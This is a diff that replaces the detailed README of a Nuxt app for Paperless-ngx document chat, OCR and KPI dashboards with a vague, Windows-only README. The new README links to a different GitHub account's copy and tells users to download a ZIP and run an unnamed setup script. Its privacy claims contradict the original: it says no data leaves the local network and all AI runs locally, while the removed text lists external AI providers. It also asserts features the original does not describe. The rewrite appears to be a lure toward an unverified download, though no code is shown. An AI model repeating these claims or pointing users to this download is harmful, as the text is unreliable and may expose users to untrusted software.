@@ -1,379 +1,77 @@
-<p align="center">
-  <img src="app/assets/images/logo.png" alt="Taan Mind" width="80" height="80">
-  <h1 align="center">Taan Mind</h1>
-</p>
-
-<p align="center">
-  A privacy-focused AI workspace for chat, automatic OCR, document workflows, and KPI dashboards — built with Nuxt 4.
-</p>
-
-<p align="center">
-  Based on the <a href="https://github.com/nuxt-ui-templates/chat">Nuxt UI Chat Template</a> and adapted into an AI-powered companion for <a href="https://github.com/paperless-ngx/paperless-ngx">Paperless-ngx</a> with document sync, OCR, metadata enrichment, and document-aware chat.
-</p>
-
-<p align="center">
-  <img alt="Nuxt 4.4.2" src="https://img.shields.io/badge/Nuxt-4.4.2-00DC82?style=for-the-badge&logo=nuxt&logoColor=white">
-  <img alt="Nuxt UI 4.6.1" src="https://img.shields.io/badge/Nuxt%20UI-4.6.1-00DC82?style=for-the-badge&logo=nuxt&logoColor=white">
-  <a href="https://ui.nuxt.com"><img alt="Made with Nuxt UI" src="https://img.shields.io/badge/Made%20with-Nuxt%20UI-00DC82?style=for-the-badge&logo=nuxt&logoColor=white&labelColor=111827"></a>
-  <img alt="AI SDK 6.0.158" src="https://img.shields.io/badge/AI%20SDK-6.0.158-000000?style=for-the-badge&logo=vercel&logoColor=white">
-  <img alt="Drizzle ORM 0.45.2" src="https://img.shields.io/badge/Drizzle%20ORM-0.45.2-C5F74F?style=for-the-badge&logo=drizzle&logoColor=000000">
-  <img alt="Tailwind CSS 4.2.2" src="https://img.shields.io/badge/Tailwind%20CSS-4.2.2-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white">
-  <img alt="Ollama runtime" src="https://img.shields.io/badge/Ollama-Runtime-111111?style=for-the-badge&logo=ollama&logoColor=white">
-  <img alt="nuxt-charts 2.1.4" src="https://img.shields.io/badge/nuxt--charts-2.1.4-FF6384?style=for-the-badge&logo=chartdotjs&logoColor=white"> <a href="https://deepwiki.com/zademy/taan-mind"><img alt="DeepWiki" src="https://img.shields.io/badge/DeepWiki-Ask%20AI-5b21b6?style=for-the-badge&logo=googledocs&logoColor=white"></a>
-</p>
-
----
-
-## Features
-
-- **AI Chat** — Streaming conversations with multiple AI providers (MiniMax, GLM, Nova, and available Ollama models) and personality presets
-- **[Paperless-ngx](https://github.com/paperless-ngx/paperless-ngx) Integration** — Full document management proxy with CRUD, search, and binary download
-- **Automatic OCR** — Background document processing pipeline using Ollama + MuPDF
-- **AI Metadata Extraction** — Auto-suggest titles, tags, correspondents, and document types
-- **KPI Dashboard** — Document statistics with interactive charts (status, timeline, MIME type, document type)
-- **Document Context** — Inject [Paperless-ngx](https://github.com/paperless-ngx/paperless-ngx) document content (OCR/AI-processed) as context into chats
-- **AI Tools** — Chart generation, weather forecasts, and web search sources
-- **Anonymous Sessions** — No login required, HTTP-only session cookies with local SQLite storage
-- **Docker Ready** — Multi-stage Dockerfile with hardened runtime and integrated Paperless-ngx stack via Docker Compose
-
-## Tech Stack
-
-| Technology                                           | Purpose                            |
-| ---------------------------------------------------- | ---------------------------------- |
-| [Nuxt 4](https://nuxt.com/)                          | Full-stack Vue 3 framework         |
-| [Nuxt UI 4](https://ui.nuxt.com/)                    | Component library (Tailwind CSS 4) |
-| [AI SDK](https://sdk.vercel.ai/)                     | Streaming AI integration           |
-| [Drizzle ORM](https://orm.drizzle.team/)             | Type-safe SQLite ORM               |
-| [NuxtHub](https://hub.nuxt.com/)                     | Database & deployment              |
-| [Ollama](https://ollama.com/)                        | Local LLM for OCR                  |
-| [MuPDF](https://mupdf.com/)                          | PDF/image processing               |
-| [Comark](https://comark.ca/)                         | Markdown rendering                 |
-| [nuxt-charts](https://github.com/nuxt-modules/chart) | Chart.js visualizations            |
-
-## Architecture Overview
-
-The application combines a Nuxt user interface, Nitro API routes, background workers, Paperless-ngx, local SQLite storage, and AI providers. The diagram below shows the main runtime flow from the user to document storage, OCR, enrichment, and synchronization.
-
-```mermaid
-flowchart LR
-  internet["User / Internet"]
-
-  subgraph client["Client"]
-    browser["Browser"]
-    nuxtApp["Nuxt UI\npages, components, composables"]
-  end
-
-  subgraph app["Taan Mind App"]
-    api["Nitro API Layer"]
-    chatApi["Chat API\n/api/chats/*"]
-    paperlessProxy["Paperless Proxy\n/api/paperless/*"]
-    cacheApi["Cache and KPI APIs\n/api/cache, /api/kpi"]
-    ocrApi["OCR API\n/api/ocr/*"]
-    settingsApi["Settings API\n/api/settings/*"]
-    modelRegistry["Model Registry\nshared/utils/models.ts"]
-    syncWorker["Paperless Sync Plugin\nperiodic import"]
-    processor["Document Processor Plugin\nOCR → cleanup → AI enrichment → Paperless patch"]
-    appDb["SQLite / NuxtHub DB\nchats, messages, document cache, settings"]
-  end
-
-  subgraph ai["AI and OCR Models"]
-    externalModels["External AI Providers\nMiniMax, GLM, Nova"]
-    ollamaChat["Ollama Chat Models\nnon-OCR models"]
-    ollamaOcr["Ollama OCR Models\nglm-ocr, OCR-GLM"]
-    mupdf["MuPDF\nPDF/image page extraction"]
-  end
-
-  subgraph paperless["Paperless-ngx Stack"]
-    paperlessApi["Paperless-ngx API"]
-    paperlessDb["PostgreSQL\nPaperless metadata"]
-    redis["Redis\nbackground task broker"]
-    tika["Tika\ntext extraction"]
-    gotenberg["Gotenberg\nPDF rendering"]
-    media["Document Media\noriginal files, previews, thumbnails"]
-  end
-
-  internet --> browser --> nuxtApp --> api
-
-  api --> chatApi
-  api --> paperlessProxy
-  api --> cacheApi
-  api --> ocrApi
-  api --> settingsApi
-
-  chatApi --> modelRegistry
-  chatApi --> externalModels
-  chatApi --> ollamaChat
-  chatApi --> appDb
-
-  settingsApi --> modelRegistry
-  settingsApi --> appDb
-
-  cacheApi --> appDb
-  paperlessProxy --> paperlessApi
-
-  ocrApi --> mupdf
-  ocrApi --> ollamaOcr
+# 🧠 taan-mind - Make sense of your stored documents
 
-  syncWorker --> paperlessApi
-  syncWorker --> appDb
+[![](https://img.shields.io/badge/Download-taan--mind-blue.svg)](https://github.com/novafadill9744/taan-mind)
 
-  processor --> appDb
-  processor --> ocrApi
-  processor --> modelRegistry
-  processor --> externalModels
-  processor --> ollamaChat
-  processor --> paperlessApi
-
-  paperlessApi --> paperlessDb
-  paperlessApi --> redis
-  paperlessApi --> tika
-  paperlessApi --> gotenberg
-  paperlessApi --> media
-```
-
-At a high level:
-
-- Users interact with the Nuxt client, which calls Nitro API routes.
-- Chat requests use the shared model registry and can call MiniMax, GLM, Nova, or selectable non-OCR Ollama models.
-- OCR requests use MuPDF and OCR-specific Ollama models to extract document text.
-- The Paperless proxy keeps Paperless operations behind the app API.
-- The sync worker imports Paperless document metadata into the app database.
-- The document processor reads cached documents, runs OCR, enriches the result with the selected AI model, and patches missing metadata back into Paperless.
-- SQLite stores app-owned data such as anonymous chats, cached document content, processing status, and settings.
-- Paperless keeps its own metadata, task queue, rendering services, and media files inside the Paperless-ngx stack.
-
-## Screenshots
-
-<p align="center">
-  <a href="images/01.png"><img src="images/01.png" width="32%"></a>
-  <a href="images/02.png"><img src="images/02.png" width="32%"></a>
-  <a href="images/03.png"><img src="images/03.png" width="32%"></a>
-</p>
-<p align="center">
-  <a href="images/04.png"><img src="images/04.png" width="32%"></a>
-  <a href="images/05.png"><img src="images/05.png" width="32%"></a>
-  <a href="images/06.png"><img src="images/06.png" width="32%"></a>
-</p>
-<p align="center">
-  <a href="images/07.png"><img src="images/07.png" width="32%"></a>
-  <a href="images/08.png"><img src="images/08.png" width="32%"></a>
-  <a href="images/09.png"><img src="images/09.png" width="32%"></a>
-</p>
-<p align="center">
-  <a href="images/10.png"><img src="images/10.png" width="32%"></a>
-  <a href="images/11.png"><img src="images/11.png" width="32%"></a>
-  <a href="images/12.png"><img src="images/12.png" width="32%"></a>
-</p>
-
-## Getting Started
-
-### Prerequisites
-
-- Node.js 22+
-- pnpm 10+
+## 📋 What is taan-mind?
 
-### Installation
+Taan-mind works with Paperless-ngx to help you manage your documents. It provides a chat interface to ask questions about your files. The tool extracts data from documents, performs Optical Character Recognition, and tracks key performance indicators. It simplifies how you interact with your digital filing cabinet.
 
-```bash
-git clone https://github.com/zademy/taan-mind.git
-cd taan-mind
-pnpm install
-```
+## ⚙️ System Requirements
 
-### Configuration
+Before you install this tool, make sure your computer meets these requirements:
 
-```bash
-cp .env.example .env
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 8GB of RAM.
+*   Storage: 2GB of free space.
+*   Software: Docker Desktop must be installed and running on your machine.
+*   Paperless-ngx: A working instance of Paperless-ngx is required.
 
-Edit `.env` with your API keys (see [Environment Variables](#environment-variables)).
+## 📥 How to Download 
 
-### Development
+Visit [this page](https://github.com/novafadill9744/taan-mind) to download the application files. 
 
-```bash
-pnpm dev
-```
+Click the green button labeled "Code" and choose "Download ZIP". Save this folder to your desktop or a location where you can find it. Extract the contents of the ZIP file into a new folder on your computer.
 
-Open [http://localhost:3000](http://localhost:3000).
+## 🚀 Setting Up the Software
 
-### Docker Compose (Full Stack)
+Follow these steps to prepare your system:
 
-The included `docker-compose.yml` spins up the entire stack — the app, Paperless-ngx (with Redis, PostgreSQL, Gotenberg, and Tika), and a bootstrap service that creates the admin user and API token.
+1.  Open Docker Desktop. Wait for the green status light that shows the engine is running.
+2.  Open your command prompt or terminal. Type `cd` followed by a space, then drag the folder you extracted into the terminal window. Press Enter.
+3.  Ensure your Paperless-ngx connection details are ready. You need your API token and the URL of your Paperless-ngx instance.
+4.  Run the setup script included in the folder. This script configures the connection between taan-mind and your paperless storage.
+5.  Launch the application interface in your web browser. 
 
-```bash
-# Build and start everything
-docker compose up -d --build
+## 🤖 Using AI for Documents
 
-# Remove the completed bootstrap container after startup
-docker compose rm -f paperless-bootstrap
-```
-
-> [!NOTE]
-> Docker Compose does **not** start Ollama. See [Ollama Runtime](#ollama-runtime) for details.
-
-The app runs on `http://localhost:3000` and Paperless-ngx on `http://localhost:8000`.
-
-## Environment Variables
-
-| Variable                       | Required | Description                                                       |
-| ------------------------------ | -------- | ----------------------------------------------------------------- |
-| `MINIMAX_API_KEY`              | Yes      | MiniMax API key                                                   |
-| `MINIMAX_BASE_URL`             | No       | MiniMax API endpoint                                              |
-| `GLM_API_KEY`                  | Yes      | Z.AI GLM API key                                                  |
-| `GLM_BASE_URL`                 | No       | Z.AI API endpoint                                                 |
-| `NOVA_API_KEY`                 | Yes      | Amazon Nova API key                                               |
-| `NOVA_BASE_URL`                | No       | Amazon Nova API endpoint                                          |
-| `NUXT_PAPERLESS_BASE_URL`      | Yes      | Paperless-ngx instance URL                                        |
-| `NUXT_PAPERLESS_API_TOKEN`     | Yes      | Paperless-ngx API token                                           |
-| `PAPERLESS_BOOTSTRAP_USER`     | No       | Admin user created by Docker Compose (`paperless`)                |
-| `PAPERLESS_BOOTSTRAP_PASSWORD` | No       | Password for the bootstrap admin user (`paperless`)               |
-| `PAPERLESS_BOOTSTRAP_EMAIL`    | No       | Email for the bootstrap admin user (`paperless@example.local`)    |
-| `NUXT_OLLAMA_BASE_URL`         | No       | Ollama server URL (`http://host.docker.internal:11434` in Docker) |
-| `NUXT_OLLAMA_MODEL`            | No       | Ollama model for OCR (`glm-ocr:latest`)                           |
-| `NUXT_SYNC_INTERVAL_MS`        | No       | Paperless sync interval in ms (`5000`)                            |
-| `NUXT_PROCESS_INTERVAL_MS`     | No       | Document processing interval in ms (`10000`)                      |
-
-## Ollama Runtime
-
-Docker Compose does not start Ollama. Run Ollama outside this stack and point the app to it with `NUXT_OLLAMA_BASE_URL`. When reachable, locally pulled Ollama models are automatically listed in the chat model selector.
-
-This is intentional. Ollama runtime choices depend on the host operating system and hardware:
-
-- **macOS** — Install Ollama on the host for Metal GPU acceleration
-- **Linux + NVIDIA** — Use Docker GPU support (requires NVIDIA Container Toolkit)
-- **Linux + AMD** — Requires ROCm and different device mappings
-- **No GPU** — Run Ollama on CPU
-
-Install Ollama for your host, then pull the OCR model and any chat models you want to expose:
-
-```bash
-ollama pull glm-ocr:latest
-ollama pull llama3.2:latest
-```
-
-For Docker Compose, configure the app container to reach host Ollama:
-
-```env
-NUXT_OLLAMA_BASE_URL=http://host.docker.internal:11434
-NUXT_OLLAMA_MODEL=glm-ocr:latest
-```
-
-For local development without Docker:
-
-```env
-NUXT_OLLAMA_BASE_URL=http://localhost:11434
-NUXT_OLLAMA_MODEL=glm-ocr:latest
-```
-
-## Docker Compose Paperless Bootstrap
-
-When you run the integrated Docker Compose stack, the `paperless-bootstrap` service waits for Paperless-ngx to become healthy, then creates or updates an admin user and registers the API token used by the app.
-
-Default bootstrap identity:
-
-```env
-PAPERLESS_BOOTSTRAP_USER=paperless
-PAPERLESS_BOOTSTRAP_PASSWORD=paperless
-PAPERLESS_BOOTSTRAP_EMAIL=paperless@example.local
-```
-
-Token behavior:
-
-```env
-# Manual mode: use this exact token for Paperless and the app.
-NUXT_PAPERLESS_API_TOKEN=your_token_here
-
-# Automatic mode: leave it empty and let the stack derive a token deterministically.
-NUXT_PAPERLESS_API_TOKEN=
-```
-
-If `NUXT_PAPERLESS_API_TOKEN` has a value, `paperless-bootstrap` registers that exact token in Paperless and the app uses the same value.
-
-If `NUXT_PAPERLESS_API_TOKEN` is empty, the stack derives the token from the bootstrap identity and `PAPERLESS_SECRET_KEY`. The same deterministic input values must be available to both `paperless-bootstrap` and the app.
-
-> [!TIP]
-> Change the bootstrap values in `.env` before the first `docker compose up` if you want different Paperless admin credentials.
-
-## Project Structure
-
-```
-paperless-ui-chat/
-├── app/
-│   ├── components/          # Vue components (chat, tools, selectors, stats)
-│   ├── composables/         # Reactive logic (models, chats, paperless, OCR, stats)
-│   ├── layouts/             # App layout with collapsible sidebar
-│   ├── pages/               # Routes: /, /chat/[id], /documents
-│   └── utils/               # Client-side helpers
-├── server/
-│   ├── api/                 # API routes (chats, cache, OCR, paperless proxy, KPI, health)
-│   ├── db/                  # Drizzle schema + migrations (chats, messages, paperless_documents)
-│   ├── plugins/             # Background sync & document processing
-│   └── utils/               # Server utilities (AI models, session, OCR pipeline)
-├── shared/
-│   ├── types/               # Shared TypeScript types
-│   └── utils/               # Models, personalities, AI tool definitions
-├── .github/workflows/       # CI (lint + typecheck)
-├── docker-compose.yml       # Full stack with Paperless-ngx
-├── Dockerfile               # Multi-stage build with auto-migration entrypoint
-└── nuxt.config.ts
-```
-
-## API Overview
-
-| Endpoint                   | Description                                                           |
-| -------------------------- | --------------------------------------------------------------------- |
-| `POST /api/chats/:id`      | AI streaming chat with document context and tool support              |
-| `GET /api/cache/documents` | Paginated cached documents with filters and sorting                   |
-| `GET /api/kpi/documents`   | Aggregated document statistics (status, MIME type, month, type)       |
-| `GET /api/health`          | Lightweight liveness check for container health                       |
-| `POST /api/ocr/extract`    | Extract text from uploaded files via Ollama + MuPDF                   |
-| `/api/paperless/*`         | Full Paperless-ngx CRUD proxy (documents, tags, correspondents, etc.) |
-
-## AI Models
-
-| Provider | Model ID               | Display Name                                         |
-| -------- | ---------------------- | ---------------------------------------------------- |
-| MiniMax  | `minimax/MiniMax-M2.7` | MiniMax M2.7                                         |
-| GLM      | `glm/glm-5`            | GLM 5                                                |
-| GLM      | `glm/glm-5.1`          | GLM 5.1                                              |
-| GLM      | `glm/glm-5-turbo`      | GLM 5 Turbo                                          |
-| Nova     | `nova/nova-2-lite-v1`  | Amazon Nova 2 Lite                                   |
-| Nova     | `nova/nova-micro-v1`   | Amazon Nova Micro                                    |
-| Nova     | `nova/nova-lite-v1`    | Amazon Nova Lite                                     |
-| Nova     | `nova/nova-pro-v1`     | Amazon Nova Pro                                      |
-| Nova     | `nova/nova-premier-v1` | Amazon Nova Premier                                  |
-| Ollama   | `ollama/<model-name>`  | Discovered from `/api/tags` when Ollama is reachable |
-
-> [!NOTE]
-> Ollama models are dynamic. If `NUXT_OLLAMA_BASE_URL` is not configured or Ollama is unreachable, the selector still shows the static MiniMax/GLM/Nova models.
-> Nova extended reasoning is enabled with `high` effort only for `nova/nova-2-lite-v1`; other Nova models are called without `reasoning_effort`.
-
-## Scripts
-
-| Script              | Purpose                                          |
-| ------------------- | ------------------------------------------------ |
-| `pnpm dev`          | Start development server                         |
-| `pnpm build`        | Build for production                             |
-| `pnpm build:check`  | Verify formatting and linting, then build        |
-| `pnpm preview`      | Preview production build                         |
-| `pnpm lint`         | Run ESLint                                       |
-| `pnpm lint:fix`     | Run ESLint and apply safe fixes                  |
-| `pnpm format`       | Format project files with Prettier               |
-| `pnpm format:check` | Check Prettier formatting without changing files |
-| `pnpm typecheck`    | Run Vue TypeScript type checking                 |
-| `pnpm db:generate`  | Generate Drizzle migrations                      |
-| `pnpm db:migrate`   | Run database migrations                          |
-
-## Acknowledgements
-
-Taan Mind started from the [Nuxt UI Chat Template](https://github.com/nuxt-ui-templates/chat), then evolved into a Paperless-ngx companion with document sync, OCR, AI metadata enrichment, and Docker-first deployment. Credit belongs to the template authors for the original UI and chat foundation; the Paperless-specific workflows and deployment changes were added for this project.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## Support Development
-
-If Tata-Mind is useful to you, consider buying me a coffee!
-
-<a href="https://ko-fi.com/C0C01Y1SQI" target="_blank"><img height="26" src="https://img.shields.io/badge/Donate-Ko--fi-FF5E5B?style=for-the-badge&logo=ko-fi&logoColor=white" alt="Donate with Ko-fi" /></a> <a href="https://buy.stripe.com/00wcN67J46kl8LY8GYfMA01" target="_blank"><img height="26" src="https://img.shields.io/badge/Donate-Stripe-635bff?style=for-the-badge&logo=stripe&logoColor=white" alt="Donate with Stripe" /></a>
+Taan-mind provides several tools to manage your files:
+
+*   Document Chat: Select a document and type a question. The system searches your file and provides an answer.
+*   Metadata Extraction: The system reads your document and fills in fields like dates, vendors, and total amounts automatically.
+*   OCR Workflows: If your document is a scan or a photo, the AI converts the image into text so you can search for it later.
+*   KPI Dashboard: Monitor the status of your filing system. View statistics on document volume and processing speed.
+
+## 🛠️ Configuration Options
+
+You can adjust how the application behaves by editing the configuration file located in the root folder. Open this file with a text editor like Notepad. 
+
+- API_KEY: This allows taan-mind to talk to your Paperless-ngx instance. Enter your unique token here.
+- MODEL_PREFERENCE: You can toggle between different AI models to balance speed and accuracy. 
+- OCR_LEVEL: Adjust this setting if you scan many hand-written notes or low-quality documents.
+
+Restart the software after you change these settings to apply the updates.
+
+## 💡 Best Practices
+
+For the best results, organize your documents by type. Ensure your scans have good lighting to improve text recognition. If the system misses a detail, you can manually update the metadata through the web interface. The system learns from these manual edits over time.
+
+## 🆘 Troubleshooting Common Issues
+
+If the software does not load, verify these common items:
+
+- Docker status: Confirm that the Docker icon is in the system tray and showing a "Running" status.
+- Port conflicts: If you have other web services running, they might use the same port as taan-mind. Change the port settings in your configuration file if you see a connection error.
+- Network access: Ensure your firewall allows the application to communicate with your local Paperless-ngx instance.
+- Memory usage: High-resolution scanning requires more RAM. Close unused browser tabs if the system runs slowly.
+
+## 📦 Keeping Software Current
+
+Check the download page periodically for new versions. Updates include improvements to document processing and new AI capabilities. To update, download the new ZIP file, extract it, and replace the old files. Always back up your configuration file before replacing the folder contents.
+
+## 🔒 Data Privacy
+
+Your documents stay within your control. The system connects directly to your local Paperless-ngx installation. No sensitive data leaves your local network during the processing steps. All AI operations occur through local interaction with the Ollama engine. 
+
+## 👥 Need More Help?
+
+If you encounter issues during installation, open a new ticket on the project page. Include the steps you took and any error messages you see on your screen. This helps the team identify the cause of the problem. Provide clear information about your version of Windows and your Docker setup to speed up the response.
